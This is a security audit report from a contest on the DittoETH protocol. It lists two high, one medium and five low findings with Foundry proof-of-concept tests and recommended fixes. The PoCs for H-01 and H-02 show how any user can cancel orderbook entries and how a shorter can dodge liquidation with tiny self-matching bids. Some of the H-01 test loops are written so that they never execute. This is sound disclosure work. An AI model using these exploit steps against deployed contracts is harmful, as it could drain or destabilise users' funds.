# DittoETH - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Any user can delete all limit orders from the orderbook](#H-01)
    - ### [H-02. Short can stay at CR of 150% without being liquidated](#H-02)
- ## Medium Risk Findings
    - ### [M-01. Possible DOS on deposit(), withdraw() and unstake() for BridgeReth, leading to user loss of funds](#M-01)
- ## Low Risk Findings
    - ### [L-01. Loss of precision in `twapPrice`](#L-01)
    - ### [L-02. Unhandled chainlink revert would DOS entire protocol](#L-02)
    - ### [L-03. Withdrawals are unreliable and depend on excess `RocketDepositPool` balance which can lead to a 'bank run'](#L-03)
    - ### [L-04. Bridge design is liquidity imbalanced and can cause non ERC721 compatible smart contracts depositors to cannot withdraw](#L-04)
    - ### [L-05. Incorrect require in setter](#L-05)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: Ditto

### Dates: Sep 8th, 2023 - Oct 9th, 2023

[See more contest details here](https://www.codehawks.com/contests/clm871gl00001mp081mzjdlwc)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 1
   - Low: 5


# High Risk Findings

## <a id='H-01'></a>H-01. Any user can delete all limit orders from the orderbook            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OrdersFacet.sol#L124

## Summary
Once the `s.asset[asset].orderId`, which in theory represents number of orders in the orderbook surpasses 65_000, any user can call `cancelOrderFarFromOracle()` with the last orderId, and delete the last order until there are no more orders.
## Vulnerability Details
The problem is `s.asset[asset].orderId` isn't decremented in any case in the entire protocol, even when an order is deleted, as is the case in `cancelOrderFarFromOracle()`.   
In any point that the `orderId` surpasses 65_000, either naturally over time, or artificially by a malicious actor in a few blocks creating countless orders, `cancelOrderFarFromOracle()` won't revert even the orders left in the orderbook are 1.

### POC
First, uncomment the console import.   
Replace the [`setOrderIdAndMakeOrders()` at `test/CancelOrder.t.sol`](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/test/CancelOrder.t.sol#L191C1-L208C6) with the following code:   
``` solidity
    function setOrderIdAndMakeOrders(O orderType) public {
        vm.prank(owner);
        testFacet.setOrderIdT(asset, 64500); // set this to 64500
        if (orderType == O.LimitBid) {
            for (uint256 i; i < 500; i++) { // set to 500
                console.log(i);
                fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
            }
        } else if (orderType == O.LimitAsk) { // set to 500
            for (uint256 i; i < 500; i++) {
                fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
            }
        } else if (orderType == O.LimitShort) { 
            for (uint256 i; i < 500; i++) { // set tot 500
                fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
            }
        }
        assertEq(diamond.getAssetNormalizedStruct(asset).orderId, 65000); // set this to 65000, now cancelOrderFarFromOracle() doesn't revert
    }
```
Copy-paste the following code at the end of the `test/CancelOrder.t.sol::CancelOrderTest` contract:  
``` solidity
    function testCancelOrderIfOrderIDTooHighBidPOC() public {
        // in setOrderIdT, orderId is set to 65000 artificially
        // we have to create the amount of orders necessary to demonstrate the POC
        setOrderIdAndMakeOrders({orderType: O.LimitBid});
        uint previousOrderId = diamond.getAssetNormalizedStruct(asset).orderId;
        for (uint256 i = 0; i > 500; i++) {
            diamond.cancelOrderFarFromOracle({
                asset: asset,
                orderType: O.LimitBid,
                lastOrderId: uint16(64_499 - i),
                numOrdersToCancel: 1
            });
        }
        console.log("Normal user has been able to remove 500 orders from the orderbook");
        assertEq(diamond.getAssetNormalizedStruct(asset).orderId, 65_000); // s.asset[asset].orderId hasn't changed even 500 orders have been deleted
        assertEq(previousOrderId, 65_000);
        console.log("s.asset[asset].orderId hasn't changed");
    }

    function testCancelOrderIfOrderIDTooHighAskPOC() public {
        setOrderIdAndMakeOrders({orderType: O.LimitAsk});
        uint previousOrderId = diamond.getAssetNormalizedStruct(asset).orderId;
        for (uint256 i = 0; i > 500; i++) {
            diamond.cancelOrderFarFromOracle({
                asset: asset,
                orderType: O.LimitAsk,
                lastOrderId: uint16(64_499 - i),
                numOrdersToCancel: 1
            });
        }
        console.log("Normal user has been able to remove 500 orders from the orderbook");
        assertEq(diamond.getAssetNormalizedStruct(asset).orderId, 65_000);  // s.asset[asset].orderId hasn't changed even 500 orders have been deleted
        assertEq(previousOrderId, 65_000);
        console.log("s.asset[asset].orderId hasn't changed");
    }

    function testCancelOrderIfOrderIDTooHighShortPOC() public {
        setOrderIdAndMakeOrders({orderType: O.LimitShort});
        uint previousOrderId = diamond.getAssetNormalizedStruct(asset).orderId;
        for (uint256 i = 0; i > 500; i++) {
            diamond.cancelOrderFarFromOracle({
                asset: asset,
                orderType: O.LimitShort,
                lastOrderId: uint16(64_499 - i),
                numOrdersToCancel: 1
            });
        }
        console.log("Normal user has been able to remove 500 orders from the orderbook");
        assertEq(diamond.getAssetNormalizedStruct(asset).orderId, 65_000); // s.asset[asset].orderId hasn't changed even 500 orders have been deleted
        assertEq(previousOrderId, 65_000);
        console.log("s.asset[asset].orderId hasn't changed");
    }
```

Run the following command to execute functions targeting different order types:   
  - `forge test --mt testCancelOrderIfOrderIDTooHighBidPOC -vv`
  - `forge test --mt testCancelOrderIfOrderIDTooHighAskPOC -vv`
  - `forge test --mt testCancelOrderIfOrderIDTooHighShortPOC -vv`   
As you can prove, the `s.asset[asset].orderId` isn't decremented, only incremented.

P.S. 
1. The POC only decrements 500 orders because otherwise if I try to delete in a call all 65_000 orders, the test sigkills itself or it's duration is counted in hours.

## Impact
Once `s.asset[asset].orderId` surpasses 65_000, the orderbook for that specific asset will suffer a DOS, because any actor will be able to remove all limit orders as soon as they enter.
## Tools Used
Manual review and Foundry framework
## Recommendations
Decrement `s.asset[asset].orderId` when an order is canceled, so that when the total order ids is lower than 65_000, it is impossible for either the DAO or any user to delete further last orders.
## <a id='H-02'></a>H-02. Short can stay at CR of 150% without being liquidated            



## Summary
A manipulation of `short.updatedAt` by matching your flagged short repeatedly with a bid in a time period lower than 10 hours, makes your short non-primarily-liquidatable, even if you are at 150% CR, in a way that every short can do it easily and without consequences.
## Vulnerability Details
When a short is flagged it adquires a `short.flaggerId`, from then on, the owner of the short has 10 hours to increase it's collateral ratio above `primaryLiquidationCR` levels.   
The `liquidate()` checks if the 10h period has passed with the [following code](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallPrimaryFacet.sol#L351):   
``` solidity
    function _canLiquidate(MTypes.MarginCallPrimary memory m)
        private
        view
        returns (bool)
    {
        //@dev if cRatio is below the minimumCR, allow liquidation regardless of flagging
        if (m.cRatio < m.minimumCR) return true;

        //@dev Only check if flagger is empty, not updatedAt
        if (m.short.flaggerId == 0) {
            revert Errors.ShortNotFlagged();
        }

        /*
         * Timeline: 
         * 
         * updatedAt (~0 hrs)
         * ..
         * [Errors.MarginCallIneligibleWindow]
         * ..
         * firstLiquidationTime (~10hrs, +10 hrs)
         * ..
         * [return msg.sender == short.flagger]
         * ..
         * secondLiquidationTime (~12hrs, +2 hrs)
         * ..
         * [return true (msg.sender is anyone)]
         * ..
         * resetLiquidationTime (~16hrs, +4 hrs)
         * ..
         * [return false (reset flag)]
        */

        uint256 timeDiff = LibOrders.getOffsetTimeHours() - m.short.updatedAt;
        uint256 resetLiquidationTime = LibAsset.resetLiquidationTime(m.asset); // 16 hours

        if (timeDiff >= resetLiquidationTime) {
            return false;
        } else {
            uint256 secondLiquidationTime = LibAsset.secondLiquidationTime(m.asset); // 12 hours
            bool isBetweenFirstAndSecondLiquidationTime = timeDiff
                > LibAsset.firstLiquidationTime(m.asset) && timeDiff <= secondLiquidationTime // is true if between 10 and 12
                && s.flagMapping[m.short.flaggerId] == msg.sender; // only flagger can liquidate between 10 and 12
            bool isBetweenSecondAndResetLiquidationTime =
                timeDiff > secondLiquidationTime && timeDiff <= resetLiquidationTime; // is true if between 12 and 16
            if (
                !(
                    (isBetweenFirstAndSecondLiquidationTime)
                        || (isBetweenSecondAndResetLiquidationTime)
                )
            ) {
                revert Errors.MarginCallIneligibleWindow(); // enters here if timeDiff is between 0 and 10
            }

            return true;
        }
    }
```
As you can see, any call with a `timeDiff` between 0 and 10 hours will cause the `liquidate()` function to revert.   
`timeDiff` is calculated as the following:
``` solidity
uint256 timeDiff = LibOrders.getOffsetTimeHours() - m.short.updatedAt;
```
What DittoETH doesn't account for, is that by creating bids that match the flagged short, it is possible to update the `short.updatedAt` to the current `getOffsetTimeHours()`.   
If every less than 10 hours the shorter owner matches it's own short, even with an insignificant amount of zETH, doesn't matter if the short is below `primaryLiquidationCR` (between 150% and 400%), the short cannot be liquidated.

### POC
Update the imports at [test/utils/MarginCallHelper.sol](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/test/utils/MarginCallHelper.sol#L6C1-L12C1):   
``` diff
// From this
  import {U256, Math128, U88, U80} from "contracts/libraries/PRBMathHelper.sol";
  import {Constants} from "contracts/libraries/Constants.sol";
- import {STypes, O, SR} from "contracts/libraries/DataTypes.sol";
  import {Vault} from "contracts/libraries/Constants.sol";
  import {OBFixture} from "test/utils/OBFixture.sol";
  import {TestTypes} from "test/utils/TestTypes.sol";
// To this
  import {U256, Math128, U88, U80} from "contracts/libraries/PRBMathHelper.sol";
  import {Constants} from "contracts/libraries/Constants.sol";
+ import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol"; // Add MTypes
  import {Vault} from "contracts/libraries/Constants.sol";
  import {OBFixture} from "test/utils/OBFixture.sol";
  import {TestTypes} from "test/utils/TestTypes.sol";
+ import {Errors} from "contracts/libraries/Errors.sol"; // Import errors
+ import {console} from "contracts/libraries/console.sol"; // Import logging
```

Insert the following lines at [test/utils/MarginCallHelper.sol, starting at line 83](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/test/utils/MarginCallHelper.sol#L83):
``` diff
        //flag
        vm.startPrank(marginCaller);
        diamond.flagShort(asset, shorter, Constants.SHORT_STARTING_ID, Constants.HEAD);
        skipTimeAndSetEth({skipTime: TEN_HRS_PLUS, ethPrice: ethPrice});
+       // The subsequent code prevents anyone from liquidating the flagged short
+       MTypes.OrderHint[] memory orderHintArray = new MTypes.OrderHint[](1);
+       uint16[] memory shortHintArray = new uint16[](1);
+       orderHintArray[0] = MTypes.OrderHint({hintId: 101, creationTime: 123});
+       address attacker = sender;
+       depositEth(attacker, uint88(uint(1 ether).mul(1e18)));
+       vm.startPrank(attacker);
+       // First insignificant bid to create shortRecord over flagged short
+       diamond.createBid(
+           asset,
+           0.001 ether,
+           1e18,
+           true,
+           orderHintArray,
+           shortHintArray
+      );
+      // Second insignificant bid to modify short.updatedAt to current time
+       diamond.createBid(
+           asset,
+           0.001 ether,
+           1e18,
+           true,
+           orderHintArray,
+           shortHintArray
+       );
+       vm.stopPrank();
+       // Any liquidate call to this short will inevitably revert with MarginCallIneligibleWindow
+       vm.expectRevert(Errors.MarginCallIneligibleWindow.selector);
        (m.gasFee, m.ethFilled) = diamond.liquidate(
            asset, shorter, Constants.SHORT_STARTING_ID, shortHintArrayStorage
        );
        m.tappFee = m.ethFilled.mul(tappFeePct);
        m.callerFee = m.ethFilled.mul(callerFeePct);

        return (m);
    }
```
Once copy pasted, run the following 2 commands:   
`forge test --mt testPrimaryFullLiquidateCratioScenario1FromShort -vvv`   
`forge test --mt testPrimaryFullLiquidateCratioScenario1CalledByTappFromShort -vvv`   
Once you run each one, if you scroll up, you can see that the liquidate call reverts with `MarginCallIneligibleWindow`.
## Impact
This would make DittoETH solvency and the price stability of pegged assets highly compromised, resulting in significant damage to the protocol.   
Malicious shorters could have **more than 3 times the same pegged asset by the same collateral** than a normal position, resulting in a loss in protocol credibility, robustness and augmenting overall tail risk.
## Tools Used
Manual Review and Foundry.
## Recommendations
There's 2 options:
  - If a short is flagged, it cannot be bought.
  - Minimum bid over a short should be a significant % of the short collateral.
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Possible DOS on deposit(), withdraw() and unstake() for BridgeReth, leading to user loss of funds            



## Summary
Future changes on deposit delay on rETH tokens would prevent DittoETH users to use deposit(), withdraw() and unstake() for BridgeReth, which would make its transfering and burning impractical, leading to user funds losses.
## Vulnerability Details
RocketPool rETH tokens has a [deposit delay](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L157-L172) that prevents any user who has recently deposited to transfer or burn tokens. In the past this delay was set to 5760 blocks mined (aprox. 19h, considering one block per 12s). This delay can prevent DittoETH users from transfering if another user staked recently.

File: RocketTokenRETH.sol
``` solidity
  // This is called by the base ERC20 contract before all transfer, mint, and burns
    function _beforeTokenTransfer(address from, address, uint256) internal override {
        // Don't run check if this is a mint transaction
        if (from != address(0)) {
            // Check which block the user's last deposit was
            bytes32 key = keccak256(abi.encodePacked("user.deposit.block", from));
            uint256 lastDepositBlock = getUint(key);
            if (lastDepositBlock > 0) {
                // Ensure enough blocks have passed
                uint256 depositDelay = getUint(keccak256(abi.encodePacked(keccak256("dao.protocol.setting.network"), "network.reth.deposit.delay")));
                uint256 blocksPassed = block.number.sub(lastDepositBlock);
                require(blocksPassed > depositDelay, "Not enough time has passed since deposit");
                // Clear the state as it's no longer necessary to check this until another deposit is made
                deleteUint(key);
            }
        }
    }
```

Any future changes made to this delay by the admins could potentially lead to a denial-of-service attack on the `BridgeRouterFacet::deposit` and `BridgeRouterFacet::withdraw` mechanism for the rETH bridge.
## Impact
Currently, the delay is set to zero, but if RocketPool admins decide to change this value in the future, it could cause issues. Specifically, protocol users staking actions could prevent other users from unstaking for a few hours. Given that many users call the stake function throughout the day, the delay would constantly reset, making the unstaking mechanism unusable. It's important to note that this only occurs when stake() is used through the rocketDepositPool route. If rETH is obtained from the Uniswap pool, the delay is not affected.   
All the ETH swapped for rETH calling `BridgeReth::depositEth` would become irrecuperable, leading to a user bank run on DittoETH to not be perjudicated of this protocol externalization to all the users that have deposited.
## Tools Used
Manual review.
## Recommendations
Consider modifying Reth bridge to obtain rETH only through the UniswapV3 pool, on average users will get less rETH due to the slippage, but will avoid any future issues with the deposit delay mechanism.

# Low Risk Findings

## <a id='L-01'></a>L-01. Loss of precision in `twapPrice`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOracle.sol#L85

## Summary
When the Chainlink price feed has `invalidFetchData` or `priceDeviation` it will call the Uniswap WETH-USDC pool `observe()` function as a backup, but in its conversion to Ether, it has significant precision loss.
## Vulnerability Details
The `/` division operator is used instead of `.div()` from `PRBMathHelper`, which leads to roundings to zero which diverts the stored price from the real price.   
``` solidity
 uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
```

### POC
First, uncomment the console import.  
Then, add this after [line 85 of contracts/libraries/LibOracle.sol](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOracle.sol#L85):
``` diff
    uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether; // @audit precision loss
+   console.log("Current"); // 1_902_000_000_000_000_000_000 -> 90% ETH price drop -> 190_200_000_000_000_000_0000
+   console.log(twapPriceInEther);
+   uint256 twapPriceInEtherNoPrecissionLoss = (twapPrice.div(Constants.DECIMAL_USDC)) * 10 /*<==> (1 ether / 1e17) to remove leading zeroes resulting of .div() precision scaling */; // no precission loss
+   console.log("No precission loss"); 
+   console.log(twapPriceInEtherNoPrecissionLoss); // 1_902_501_929_000_000_000_000 -> 90% ETH price drop -> 190_260_455_000_000_000_000
```
You can run this numbers with:
`FOUNDRY_PROFILE=fork forge test --mt testFork_MultiAsset -vv`
## Impact
Ranging from 0.04% at current market price, which would be magnified to 0.4% if Eth price dropped by an order of magnitude.   
At current market price -> `(1_902_501_929_000_000_000_000 / 1_902_000_000_000_000_000_000) * 100 = 0.026%`   
At 90% below market price -> `(190_260_455_000_000_000_000 / 190_200_000_000_000_000_000) * 100 = 0.032%`   
Percentages similar to AMM slippage, which would be unattractive in an Orderbook like Ditto is since one of its promises is being slippage free.
## Tools Used
Manual review and Chisel
## Recommendations
``` diff
- uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
+ uint256 twapPriceInEther = (twapPrice.div(Constants.DECIMAL_USDC) / 1e17) * 1 ether; // division by 1e17 to remove leading zeroes resulting of .div() precision scaling
```
## <a id='L-02'></a>L-02. Unhandled chainlink revert would DOS entire protocol            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOracle.sol#L32

https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOracle.sol#L55

## Summary
Chainlink’s multisigs can immediately block access to price feeds at will, which would cause the `getOraclePrice()` to revert. Therefore, protocol should take a defensive approach to it, currently, if such an scenario occurs, Ditto would overgo a total DOS of its major features in the affected vaults, if it were to happen in the ETH/USD price feed, the damage would be devastating.
## Vulnerability Details
To prevent denial of service scenarios, it is recommended to query Chainlink price feeds using a defensive approach with Solidity’s try/catch structure. In this way, if the call to the price feed fails, the caller contract is still in control and can handle any errors safely and explicitly.   
Refer to https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/ for more information regarding potential risks to account for when relying on external price feed providers.
## Impact
It would be total. No new markets could be created, no new order could be created, the existing ones couldn't be matched, liquidations would revert, yield couldn't be distributed, shorts couldn't be exited and `shutdownMarket()` also would revert, due to their dependency on `getPrice()`.
## Tools Used
Manual review, Chainlink docs and Openzeppelin blog.
## Recommendations
Surround the call to `latestRoundData()` with `try/catch` instead of calling it directly. In a scenario where the call reverts, the catch block can be used to call a fallback oracle or handle the error in any other suitable way.
## <a id='L-03'></a>L-03. Withdrawals are unreliable and depend on excess `RocketDepositPool` balance which can lead to a 'bank run'            



## Summary
A user should be able at all times to burn his zETH tokens and receive ETH in return. This requires that the rETH held by the protocol can at all times be withdrawn (i.e. converted to ETH). But because withdrawals depend on excess `RocketDepositPool` balance, the rETH pool burning could not work, making the inheriting protocol functionality bricked.
## Vulnerability Details
Withdrawals are made by calling the RocketTokenRETH.burn function:

[Source](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/bridges/BridgeReth.sol#L98)
``` solidity
function unstake(address to, uint256 amount) external onlyDiamond {
        IRocketTokenRETH rocketETHToken = _getRethContract();
        uint256 rethValue = rocketETHToken.getRethValue(amount);
        uint256 originalBalance = address(this).balance;
        rocketETHToken.burn(rethValue); // here
        uint256 netBalance = address(this).balance - originalBalance;
        if (netBalance == 0) revert NetBalanceZero();
        (bool sent,) = to.call{value: netBalance}("");
        assert(sent);
    }
```

The issue with this is that the RocketTokenRETH.burn function only allows for excess balance to be withdrawn. I.e. ETH that has been deposited by stakers but that is not yet staked on the Ethereum beacon chain. So Rocketpool allows users to burn rETH and withdraw ETH as long as the excess balance is sufficient.

### Proof of Concept
I show in this section how the current withdrawal flow for the Reth derivative is dependent on there being excess balance in the RocketDepositPool.

The current withdrawal flow calls RocketTokenRETH.burn which executes this code:

[Source](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L106-L123)
``` solidity
function burn(uint256 _rethAmount) override external {
    // Check rETH amount
    require(_rethAmount > 0, "Invalid token burn amount");
    require(balanceOf(msg.sender) >= _rethAmount, "Insufficient rETH balance");
    // Get ETH amount
    uint256 ethAmount = getEthValue(_rethAmount);
    // Get & check ETH balance
    uint256 ethBalance = getTotalCollateral();
    require(ethBalance >= ethAmount, "Insufficient ETH balance for exchange");
    // Update balance & supply
    _burn(msg.sender, _rethAmount);
    // Withdraw ETH from deposit pool if required
    withdrawDepositCollateral(ethAmount);
    // Transfer ETH to sender
    msg.sender.transfer(ethAmount);
    // Emit tokens burned event
    emit TokensBurned(msg.sender, _rethAmount, ethAmount, block.timestamp);
}
```
This executes withdrawDepositCollateral(ethAmount):

[Source](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L126-L133)
``` solidity
function withdrawDepositCollateral(uint256 _ethRequired) private {
    // Check rETH contract balance
    uint256 ethBalance = address(this).balance;
    if (ethBalance >= _ethRequired) { return; }
    // Withdraw
    RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(getContractAddress("rocketDepositPool"));
    rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance));
}
```
This then calls rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance)) to get the ETH from the excess balance:

[Source](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L194-L206)
``` solidity
function withdrawExcessBalance(uint256 _amount) override external onlyThisLatestContract onlyLatestContract("rocketTokenRETH", msg.sender) {
    // Load contracts
    RocketTokenRETHInterface rocketTokenRETH = RocketTokenRETHInterface(getContractAddress("rocketTokenRETH"));
    RocketVaultInterface rocketVault = RocketVaultInterface(getContractAddress("rocketVault"));
    // Check amount
    require(_amount <= getExcessBalance(), "Insufficient excess balance for withdrawal");
    // Withdraw ETH from vault
    rocketVault.withdrawEther(_amount);
    // Transfer to rETH contract
    rocketTokenRETH.depositExcess{value: _amount}();
    // Emit excess withdrawn event
    emit ExcessWithdrawn(msg.sender, _amount, block.timestamp);
}
```
And this function reverts if the excess balance is insufficient which you can see in the `require(_amount <= getExcessBalance(), "Insufficient excess balance for withdrawal");` check.
## Impact
All the ETH swapped for rETH calling `BridgeReth::depositEth` would be bricked for rETH, this could lead to a user 'bank run' on DittoETH to not be perjudicated of this protocol externalization to all the depositors.   
Since ETH deposits get directly deposited into rETH pool, the only available withdrawing method would be the tokens that are in the bridge, there wouldn't be all the necessary rETH available for all depositors.
## Tools Used
Manual review.
## Recommendations
Think about altering the Reth bridge to exclusively use the UniswapV3 pool for acquiring rETH. While this approach may result in users receiving slightly less rETH because of slippage, it eliminates potential problems related to deposit delays.
You can use the RocketDepositPool.getExcessBalance to check if there is sufficient excess ETH to withdraw from Rocketpool or if the withdrawal must be made via Uniswap.

Pseudocode:
``` diff
     function withdraw(uint256 amount) external onlyOwner {
-        rocketETHToken.burn(rethValue);
-        // solhint-disable-next-line
-        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(
-            ""
-        );
+        if (canWithdrawFromRocketPool(amount)) {
+            rocketETHToken.burn(rethValue);
+            // solhint-disable-next-line
+        } else {
+
+            uint256 minOut = ((((poolPrice() * amount) / 10 ** 18) *
+                ((10 ** 18 - maxSlippage))) / 10 ** 18);
+
+            IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();
+            swapExactInputSingleHop(
+                rethAddress(),
+                W_ETH_ADDRESS,
+                500,
+                amount,
+                minOut
+            );
+        }
+        // convert WETH into ETH
+        (bool sent, ) = address(msg.sender).call{value: address(this).balance}("");
     }

+    function canWithdrawFromRocketPool(uint256 _amount) private view returns (bool) {
+        address rocketDepositPoolAddress = RocketStorageInterface(
+            ROCKET_STORAGE_ADDRESS
+        ).getAddress(
+                keccak256(
+                    abi.encodePacked("contract.address", "rocketDepositPool")
+                )
+            );
+        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(
+                rocketDepositPoolAddress
+            );
+        uint256 _ethAmount = RocketTokenRETHInterface(rethAddress()).getEthValue(_amount);
+        return rocketDepositPool.getExcessBalance() >= _ethAmount;
+    }
+
```
## <a id='L-04'></a>L-04. Bridge design is liquidity imbalanced and can cause non ERC721 compatible smart contracts depositors to cannot withdraw            



## Summary
`stETH::unstake` call don't working for non ERC721 compatible smart contracts can cause a liquidity imbalance, which added to other bridge design decisions can worsen the situation unto an impossibility for non ERC721 compatible smart contracts user to pull out LSD funds.

## Vulnerability Details
Currently in the BridgeRouter facet the user can call 4 functions: `deposit`, `depositEth`, `withdraw` and `unstakeEth`.
From a user perspective, `deposit` increments your zETH at the cost of your stETH, but via a **transfer** function, `depositEth` does so but via a **submit to Lido.sol**.

For getting your `stETH` back you can call `withdraw`, which via **transfer** returns your stETH at the cost of your zETH, but `unstake` does so via a withdraw of the **WithdrawalQueueERC721.sol Lido contract**, which returns you an NFT which represents your position at the withdrawing queue.

|                     | deposit        | depositEth   | withdraw       | unstakeEth                |
|---------------------|----------------|--------------|----------------|---------------------------|
| LSD                 | -LSD           | -LSD         | +LSD           | +LSD                      |
| Internal Accounting | +ZETH          | +ZETH        | -ZETH          | -ZETH                     |
| Method used         | ERC20 transfer | Protocol (stETH::submit) | ERC20 transfer | Protocol (stETH::requestwithdrawals) |

If you have zETH with your non ERC721 compatible smart contract, you won't be able to get your stETH back via `unstakeEth`

Because there's a greater liquidity and less friction in transfer-based withdrawing (no waiting for withdrawal queue and extra transaction to reedem your NFT), and there's more liquidity in depositing via `depositEth`, due to the fact the vast majority of user have ETH over stETH, which by the way, is an action that externalizes the illiquidity to the protocol as a whole, people will tend to use `depositEth` for depositing, and `withdraw` for getting their LSD back.

Even if the affected non ERC721 compatible smart contract users that can't withdraw their zETH for stETH, but swap their zETH for rETH it's very probable that because stETH deposits will be much bigger than RETH (stETH marketcap is x14 the rETH one), stETH withdrawing demand would outperform rETH deposits in facet contract.

## Impact
At best case scenario non ERC721 compatible smart contracts only have a UX problem due to not being able to withdraw via `unstakeEth`, at worst, most of them aren't able to withdraw their LSD tokens or endure long waiting to do so.
## Tools Used
Invariant tests and manual review.
## Recommendations
Decrement `unstakeEth` bridge fees to compensate overall tradeoffs.
## <a id='L-05'></a>L-05. Incorrect require in setter            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OwnerFacet.sol#L339

## Summary
There are 3 setters in `OwnerFacet.sol` which require statement doesn't match with the error message.
## Vulnerability Details
`_setInitialMargin`, `_setPrimaryLiquidationCR` and `_setSecondaryLiquidationCR` will revert for the value 100, which will revert with an incorrect error message, which is `"below 1.0"`. When 100 is 1.0, not below.   
*Instances (3)`
``` solidity
    function _setInitialMargin(address asset, uint16 value) private {
        require(value > 100, "below 1.0"); // @audit a value of 100 is 1x, so this should be > 101
        s.asset[asset].initialMargin = value;
        require(LibAsset.initialMargin(asset) < Constants.CRATIO_MAX, "above max CR");
    }

    function _setPrimaryLiquidationCR(address asset, uint16 value) private {
        require(value > 100, "below 1.0"); // @audit a value of 100 is 1x, so this should be > 101
        require(value <= 500, "above 5.0");
        require(value < s.asset[asset].initialMargin, "above initial margin");
        s.asset[asset].primaryLiquidationCR = value;
    }

    function _setSecondaryLiquidationCR(address asset, uint16 value) private {
        require(value > 100, "below 1.0"); // @audit a value of 100 is 1x, so this should be > 101
        require(value <= 500, "above 5.0");
        require(value < s.asset[asset].primaryLiquidationCR, "above primary liquidation");
        s.asset[asset].secondaryLiquidationCR = value;
    }
```

As it is contrastable, in the below functions, this check is done correctly:
``` solidity
    function _setForcedBidPriceBuffer(address asset, uint8 value) private {
        require(value >= 100, "below 1.0");
        require(value <= 200, "above 2.0");
        s.asset[asset].forcedBidPriceBuffer = value;
    }

    function _setMinimumCR(address asset, uint8 value) private {
        require(value >= 100, "below 1.0");
        require(value <= 200, "above 2.0");
        s.asset[asset].minimumCR = value;
        require(
            LibAsset.minimumCR(asset) < LibAsset.secondaryLiquidationCR(asset),
            "above secondary liquidation"
        );
    }
```
## Impact
The incorrect value for the require statement could lead to a restriction of precion for this parameters, it wouldn't be possible to input a net value of 100.
## Tools Used
Manual review.
## Recommendations
Value to which is checked the `>` operator should be 101, not 100.